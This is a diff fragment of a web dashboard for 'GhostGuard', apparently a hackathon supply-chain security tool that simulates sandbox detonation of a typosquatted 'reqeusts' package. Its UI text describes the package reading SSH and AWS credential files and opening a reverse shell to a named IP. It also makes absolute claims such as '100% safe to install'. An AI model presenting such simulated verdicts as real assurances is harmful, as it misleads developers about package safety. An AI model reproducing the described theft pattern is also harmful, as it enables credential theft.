+              </span>
+              <span class="text-slate-400 text-xs font-mono">Micro-Sandbox Containment Enforced (0.30s)</span>
+            </div>
+            <span class="text-emerald-400 font-mono font-bold text-xs flex items-center gap-1">
+              <i data-lucide="shield-check" class="w-3.5 h-3.5"></i> Host Secrets: 100% Intact
+            </span>
+          </div>
+
+          <div class="text-slate-300 leading-relaxed font-sans text-xs">
+            <strong class="text-red-400">What Just Happened? (Hackathon & 1st-Year Plain Explanation):</strong>
+            <p class="mt-1">
+              Malicious stager attempted unauthorized read on <code>~/.ssh/id_rsa</code> and <code>~/.aws/credentials</code>, followed by opening a reverse TCP socket to <code>185.220.101.4</code>. GhostGuard trapped the system calls inside an isolated micro-container, fed dummy honeypot tokens, and issued a kernel <code>SIGKILL</code> at 0.30s. Zero developer tokens or host keystores were leaked.
+            </p>
+          </div>
+
+          <!-- Remediation Action Buttons -->
+          <div class="flex flex-wrap items-center gap-2 pt-1">
+            <button
+              type="button"
+              onclick="applyOneClickRemediation('requests')"
+              class="px-3 py-1.5 rounded bg-emerald-700 hover:bg-emerald-600 text-white font-semibold text-xs flex items-center gap-1.5 cursor-pointer shadow-sm transition-all"
+            >
+              <i data-lucide="shield-check" class="w-3.5 h-3.5"></i>
+              <span>🛡️ 1-Click Auto-Remediate (Replace with pure requests==2.31.0)</span>
+            </button>
+
+            <button
+              type="button"
+              onclick="downloadSBOM()"
+              class="px-3 py-1.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 font-medium text-xs flex items-center gap-1.5 cursor-pointer"
+            >
+              <i data-lucide="layers" class="w-3.5 h-3.5 text-slate-400"></i>
+              <span>Export Quarantined CycloneDX SBOM</span>
+            </button>
+
+            <button
+              type="button"
+              onclick="closeLiveDetonationModal(); inspectLiveFeedPackage(currentDetonationTarget, 'pypi');"
+              class="px-3 py-1.5 rounded bg-[#1f6feb] hover:bg-[#388bfd] text-white font-medium text-xs flex items-center gap-1.5 cursor-pointer"
+            >
+              <i data-lucide="code" class="w-3.5 h-3.5"></i>
+              <span>Deep AST Forensic Inspector</span>
+            </button>
+
+            <button
+              type="button"
+              onclick="restartLiveDetonation()"
+              class="px-3 py-1.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 font-medium text-xs flex items-center gap-1.5 cursor-pointer ml-auto"
+            >
+              <i data-lucide="rotate-ccw" class="w-3.5 h-3.5"></i>
+              <span>Replay Detonation</span>
+            </button>
+          </div>
+        `;
+      } else {
+        postCard.className = "m-3 p-3.5 rounded-lg border border-emerald-600/70 bg-[#0b1610] flex flex-col gap-2.5 transition-all text-xs font-sans";
+        postCard.innerHTML = `
+          <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-emerald-900/50 pb-2">
+            <div class="flex items-center gap-2">
+              <span class="px-2 py-0.5 rounded bg-emerald-900/90 text-emerald-200 border border-emerald-600 font-mono font-bold text-xs">
+                ✅ SECURITY SCORE: 100 / 100 — VERIFIED BENIGN LIBRARY
+              </span>
+              <span class="text-slate-400 text-xs font-mono">Micro-Sandbox Verified Clean (0.18s)</span>
+            </div>
+            <span class="text-emerald-400 font-mono font-bold text-xs flex items-center gap-1">
+              <i data-lucide="check-circle-2" class="w-3.5 h-3.5"></i> Ready for Production
+            </span>
+          </div>
+
+          <div class="text-slate-300 leading-relaxed font-sans text-xs">
+            <strong class="text-emerald-400">Why 100/100? (Hackathon & 1st-Year Plain Explanation):</strong>
+            <p class="mt-1">
+              This package passed all 5 stages of the GhostGuard defense shield. Cryptographic hashes match the PyPI/npm maintainer keyring. AST static code analysis verified zero obfuscated stagers and zero dynamic eval calls. The micro-sandbox confirmed zero unauthorized system calls. It is 100% safe to install.
+            </p>
+          </div>
+
+          <!-- Safe Action Buttons -->
+          <div class="flex flex-wrap items-center gap-2 pt-1">
+            <button
+              type="button"
+              onclick="generateSafeManifest()"
+              class="px-3 py-1.5 rounded bg-emerald-700 hover:bg-emerald-600 text-white font-semibold text-xs flex items-center gap-1.5 cursor-pointer shadow-sm transition-all"
+            >
+              <i data-lucide="lock" class="w-3.5 h-3.5"></i>
+              <span>🛡️ Generate Hash-Pinned Lockfile</span>
+            </button>
+
+            <button
+              type="button"
+              onclick="downloadSBOM()"
+              class="px-3 py-1.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 font-medium text-xs flex items-center gap-1.5 cursor-pointer"
+            >
+              <i data-lucide="layers" class="w-3.5 h-3.5 text-slate-400"></i>
+              <span>Export CycloneDX SBOM</span>
+            </button>
+
+            <button
+              type="button"
+              onclick="closeLiveDetonationModal(); inspectLiveFeedPackage(currentDetonationTarget, currentDetonationTarget === 'lodash' ? 'npm' : 'pypi');"
+              class="px-3 py-1.5 rounded bg-[#1f6feb] hover:bg-[#388bfd] text-white font-medium text-xs flex items-center gap-1.5 cursor-pointer"
+            >
+              <i data-lucide="code" class="w-3.5 h-3.5"></i>
+              <span>Inspect Pure AST Structure</span>
+            </button>
+
+            <button
+              type="button"
+              onclick="restartLiveDetonation()"
+              class="px-3 py-1.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 font-medium text-xs flex items-center gap-1.5 cursor-pointer ml-auto"
+            >
+              <i data-lucide="rotate-ccw" class="w-3.5 h-3.5"></i>
+              <span>Replay Verification</span>
+            </button>
+          </div>
+        `;
+      }
+
+      postCard.classList.remove('hidden');
+      if (window.lucide && typeof window.lucide.createIcons === 'function') {
+        window.lucide.createIcons();
+      }
+    }
+
+    function applyOneClickRemediation(pureName) {
+      closeLiveDetonationModal();
+      switchMainView('inspector');
+      loadPreset(pureName || 'requests');
+      switchTab('remediation');
+
+      const finding = document.getElementById('summary-finding');
+      if (finding) {
+        finding.innerHTML = `<span class="text-[#1A7F37] font-bold">✓ 1-CLICK REMEDIATION APPLIED:</span> Poisoned 'reqeusts' removed and replaced with canonical '<strong>${pureName || 'requests'}==2.31.0</strong>' with SHA-256 hash pinning.`;
+      }
+    }
 
     window.addEventListener('DOMContentLoaded', () => {
       if (window.lucide && typeof window.lucide.createIcons === 'function') {
@@ -3540,6 +4086,7 @@ ${data.ecosystem === 'npm' ? `npm install ${data.name}` : `pip install ${data.na
       switchMainView('dashboard');
     });
   </script>
+
   <!-- LIVE SANDBOX DETONATION CHAMBER MODAL (HIGH-ENERGY ATTACK TRAP SIMULATOR) -->
   <div id="sandbox-chamber-modal" class="hidden fixed inset-0 z-[100] bg-black/80 backdrop-blur-sm flex items-center justify-center p-3 sm:p-6 overflow-y-auto">
     <div class="bg-[#080c14] text-[#f0f6fc] border border-red-500/50 rounded-lg max-w-[1100px] w-full shadow-2xl flex flex-col overflow-hidden font-mono text-xs">
@@ -3569,7 +4116,7 @@ ${data.ecosystem === 'npm' ? `npm install ${data.name}` : `pip install ${data.na
             <strong id="modal-pkg-title" class="text-red-400 font-bold">reqeusts-0.1.2.tar.gz</strong>
             <span class="text-slate-500">|</span>
             <span class="text-slate-400">Threat Family:</span>
-            <span class="text-red-300">Base64 Credential Harvester (CWE-200)</span>
+            <span id="modal-threat-family" class="text-red-300">Base64 Credential Harvester (CWE-200)</span>
           </div>
           <div class="flex items-center gap-2">
             <span class="text-slate-400 font-sans">Execution Clock:</span>
@@ -3583,7 +4130,7 @@ ${data.ecosystem === 'npm' ? `npm install ${data.name}` : `pip install ${data.na
       </div>
 
       <!-- Live Split View: Attacker Action vs GhostGuard Trap -->
-      <div class="grid grid-cols-1 md:grid-cols-2 divide-y md:divide-y-0 md:divide-x divide-slate-800 p-3 gap-3 min-h-[320px]">
+      <div class="grid grid-cols-1 md:grid-cols-2 divide-y md:divide-y-0 md:divide-x divide-slate-800 p-3 gap-3 min-h-[300px]">
         
         <!-- Left: Attacker Intent (What Malware Does) -->
         <div class="flex flex-col gap-2 pr-1">
@@ -3595,7 +4142,7 @@ ${data.ecosystem === 'npm' ? `npm install ${data.name}` : `pip install ${data.na
             <span class="text-[10px] text-red-500 bg-red-950/60 px-1.5 py-0.2 rounded border border-red-800">UNTRUSTED STAGER</span>
           </div>
 
-          <div id="modal-attacker-log" class="flex flex-col gap-1.5 text-[11.5px] leading-relaxed overflow-y-auto max-h-[280px]">
+          <div id="modal-attacker-log" class="flex flex-col gap-1.5 text-[11.5px] leading-relaxed overflow-y-auto max-h-[260px]">
             <!-- Injected dynamically step by step -->
           </div>
         </div>
@@ -3610,11 +4157,16 @@ ${data.ecosystem === 'npm' ? `npm install ${data.name}` : `pip install ${data.na
             <span id="modal-sentinel-status" class="text-[10px] text-emerald-400 bg-emerald-950/60 px-1.5 py-0.2 rounded border border-emerald-800">SENTINEL ARMED</span>
           </div>
 
-          <div id="modal-sentinel-log" class="flex flex-col gap-1.5 text-[11.5px] leading-relaxed overflow-y-auto max-h-[280px]">
+          <div id="modal-sentinel-log" class="flex flex-col gap-1.5 text-[11.5px] leading-relaxed overflow-y-auto max-h-[260px]">
             <!-- Injected dynamically step by step -->
           </div>
         </div>
 
+      </div>
+
+      <!-- Expandable Post-Detonation Incident & Remediation Card -->
+      <div id="modal-post-detonation-card" class="hidden">
+        <!-- Injected dynamically when detonation completes -->
       </div>
 
       <!-- Modal Bottom Actions & Verdict -->
